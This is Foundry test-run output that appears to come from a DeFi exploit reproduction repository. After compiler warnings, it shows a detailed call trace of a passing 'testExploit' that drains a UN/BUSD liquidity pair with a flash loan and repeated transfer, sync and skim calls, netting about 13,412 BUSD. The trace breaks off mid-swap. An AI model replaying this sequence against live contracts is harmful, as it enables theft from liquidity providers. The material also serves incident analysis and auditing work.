Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.24s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 313.38ms (306.08µs CPU time)

Ran 1 test for src/test/2023-06/UN_exp.sol:ContractTest
[PASS] testExploit() (gas: 476813)
Logs:
  Attacker BUSD balance before attack: 0.010000000000000000
  Attacker BUSD balance after attack: 13412.363310180390856151

Traces:
  [538713] AttackerContract::testExploit()
    ├─ [2531] BUSD::balanceOf(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10000000000000000 [1e16]
    ├─ [2425] BUSD::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance before attack", val: 10000000000000000 [1e16], decimals: 18)
    ├─ [515846] DPPOracle::flashLoan(0, 29100000000000000000000 [2.91e22], AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [10871] BUSD::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29100000000000000000000 [2.91e22])
    │   │   ├─ emit Transfer(from: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 29100000000000000000000 [2.91e22])
    │   │   └─ ← [Return] true
    │   ├─ [478632] AttackerContract::DPPFlashLoanCall(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 29100000000000000000000 [2.91e22], 0x00)
    │   │   ├─ [2517] Pair::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 186912581853851065964787 [1.869e23], 30265800773605712024588 [3.026e22], 1686054150 [1.686e9]
    │   │   ├─ [531] BUSD::balanceOf(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 29100010000000000000000 [2.91e22]
    │   │   ├─ [8071] BUSD::transfer(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 29100010000000000000000 [2.91e22])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 29100010000000000000000 [2.91e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [139752] Pair::swap(91480714664455701397200 [9.148e22], 0, AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [104336] UN::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 91480714664455701397200 [9.148e22])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 2744421439933671041916 [2.744e21])
    │   │   │   │   ├─ [25175] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(2744421439933671041916 [2.744e21])
    │   │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f0000000000000000000000000000000000000000000000000000000000000007000000000000000000000000000000000000000000000094c67f970d3c806b7c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 914807146644557013972 [9.148e20])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 2744421439933671041916 [2.744e21])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 85077064637943802299396 [8.507e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 95431867189395364567587 [9.543e22]
    │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   ├─ emit Sync(reserve0: 95431867189395364567587 [9.543e22], reserve1: 59365810773605712024588 [5.936e22])
    │   │   │   ├─ emit Swap(sender: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 29100010000000000000000 [2.91e22], amount0Out: 91480714664455701397200 [9.148e22], amount1Out: 0, to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [623] UN::balanceOf(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 85077064637943802299396 [8.507e22]
    │   │   ├─ [57774] UN::transfer(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 79121670113287736138438 [7.912e22])
    │   │   │   ├─ emit Transfer(from: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 963001100058046058847 [9.63e20])
    │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x0000000000000000000000000000000000000000, value: 31648668045315094455375 [3.164e22])
    │   │   │   ├─ [7804] Pair::sync()
    │   │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 64746200244138316171059 [6.474e22]
    │   │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   │   ├─ emit Sync(reserve0: 64746200244138316171059 [6.474e22], reserve1: 59365810773605712024588 [5.936e22])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 2611015113738495292554 [2.611e21])
    │   │   │   ├─ [4775] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(2611015113738495292554 [2.611e21])
    │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000008d8b1d1c31b729748a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 791216701132877361380 [7.912e20])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 2531893443625207556416 [2.531e21])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 1582433402265754722760 [1.582e21])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 71605111452525401205328 [7.16e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [31770] Pair::skim(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 136351311696663717376387 [1.363e23]
    │   │   │   ├─ [20336] UN::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 71605111452525401205328 [7.16e22])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 2148153343575762036159 [2.148e21])
    │   │   │   │   ├─ [4775] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(2148153343575762036159 [2.148e21])
    │   │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f0000000000000000000000000000000000000000000000000000000000000007000000000000000000000000000000000000000000000074739dc493f4f265bf00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 716051114525254012053 [7.16e20])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 2148153343575762036159 [2.148e21])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 66592753650848623120957 [6.659e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   ├─ [3271] BUSD::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [623] UN::balanceOf(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 72548148175504689281915 [7.254e22]
    │   │   ├─ [44174] UN::transfer(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 65293333357954220353723 [6.529e22])
    │   │   │   ├─ emit Transfer(from: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 1507267815658131373433 [1.507e21])
    │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x0000000000000000000000000000000000000000, value: 26117333343181688141489 [2.611e22])
    │   │   │   ├─ [7804] Pair::sync()
    │   │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 40136134716614759403003 [4.013e22]
    │   │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   │   ├─ emit Sync(reserve0: 40136134716614759403003 [4.013e22], reserve1: 59365810773605712024588 [5.936e22])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 2154680000812489271649 [2.154e21])
    │   │   │   ├─ [4775] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(2154680000812489271649 [2.154e21])
    │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f0000000000000000000000000000000000000000000000000000000000000007000000000000000000000000000000000000000000000074ce311cc14ace696100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 652933333579542203530 [6.529e20])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 2089386667454535051296 [2.089e21])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 1305866667159084407060 [1.305e21])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 59090466688948569420188 [5.909e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [31770] Pair::skim(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 99226601405563328823191 [9.922e22]
    │   │   │   ├─ [20336] UN::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 59090466688948569420188 [5.909e22])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 1772714000668457082603 [1.772e21])
    │   │   │   │   ├─ [4775] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(1772714000668457082603 [1.772e21])
    │   │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f00000000000000000000000000000000000000000000000000000000000000070000000000000000000000000000000000000000000000601959475ddcf69eeb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 590904666889485694201 [5.909e20])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 1772714000668457082603 [1.772e21])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 54954134020722169560781 [5.495e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   ├─ [3271] BUSD::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [623] UN::balanceOf(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 62208948838272638488973 [6.22e22]
    │   │   ├─ [44174] UN::transfer(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 49767159070618110791178 [4.976e22])
    │   │   │   ├─ emit Transfer(from: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 1243838000469027897731 [1.243e21])
    │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x0000000000000000000000000000000000000000, value: 19906863628247244316471 [1.99e22])
    │   │   │   ├─ [7804] Pair::sync()
    │   │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 21473109088836542984263 [2.147e22]
    │   │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   │   ├─ emit Sync(reserve0: 21473109088836542984263 [2.147e22], reserve1: 59365810773605712024588 [5.936e22])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 1642316249330397656103 [1.642e21])
    │   │   │   ├─ [4775] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(1642316249330397656103 [1.642e21])
    │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f000000000000000000000000000000000000000000000000000000000000000700000000000000000000000000000000000000000000005907b76766ce36b42700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 497671590706181107910 [4.976e20])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 1592549090259779545312 [1.592e21])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 995343181412362215820 [9.953e20])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 45039278958909390266033 [4.503e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [31770] Pair::skim(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 66512388047745933250296 [6.651e22]
    │   │   │   ├─ [20336] UN::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 45039278958909390266033 [4.503e22])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 1351178368767281707980 [1.351e21])
    │   │   │   │   ├─ [4775] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(1351178368767281707980 [1.351e21])
    │   │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f00000000000000000000000000000000000000000000000000000000000000070000000000000000000000000000000000000000000000493f5ddf8b4595bbcc00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 450392789589093902660 [4.503e20])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 1351178368767281707980 [1.351e21])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 41886529431785732947413 [4.188e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   ├─ [3271] BUSD::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [517] Pair::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 21473109088836542984263 [2.147e22], 59365810773605712024588 [5.936e22], 1686054153 [1.686e9]
    │   │   ├─ [623] UN::balanceOf(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 54328319199440260645208 [5.432e22]
    │   │   ├─ [44174] UN::transfer(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], 54328319199440260645208 [5.432e22])
    │   │   │   ├─ emit Transfer(from: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 948064380295275010570 [9.48e20])
    │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: 0x0000000000000000000000000000000000000000, value: 21731327679776104258083 [2.173e22])
    │   │   │   ├─ [7804] Pair::sync()
    │   │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 689845789355713736750 [6.898e20]
    │   │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 59365810773605712024588 [5.936e22]
    │   │   │   │   ├─ emit Sync(reserve0: 689845789355713736750 [6.898e20], reserve1: 59365810773605712024588 [5.936e22])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xa4B5bB109c6508A8Ca880D2b4915139706783b77, value: 1792834533581528601285 [1.792e21])
    │   │   │   ├─ [4775] 0xa4B5bB109c6508A8Ca880D2b4915139706783b77::sendReward(1792834533581528601285 [1.792e21])
    │   │   │   │   ├─  emit topic 0: 0x92d297ee2a51275277405bdec54dfbcc6dc625f5f0329dd6ad0617501b2500ea
    │   │   │   │   │           data: 0x0000000000000000000000001afa48b74ba7ac0c3c5a2c8b7e24eb71d440846f00000000000000000000000000000000000000000000000000000000000000070000000000000000000000000000000000000000000000613093c572ac2592c500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UN: [0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F], value: 543283191994402606450 [5.432e20])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x760FcC8A4d4b6B31E3a2884C9Adf846c47C4e4df, value: 1738506214382088340640 [1.738e21])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 1086566383988805212900 [1.086e21])
    │   │   │   ├─ emit Transfer(from: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], value: 49167128875493435883933 [4.916e22])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [16815] Pair::swap(0, 42512363310180390856151 [4.251e22], AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [3271] BUSD::transfer(AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 42512363310180390856151 [4.251e22])
    │   │   │   │   ├─ emit Transfer(from: Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1], to: AttackerContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 42512363310180390856151 [4.251e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [623] UN::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 49856974664849149620683 [4.985e22]
    │   │   │   ├─ [531] BUSD::balanceOf(Pair: [0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1]) [staticcall]
    │   │   │   │   └─ ← [Return] 16853447463425321168437 [1.685e22]
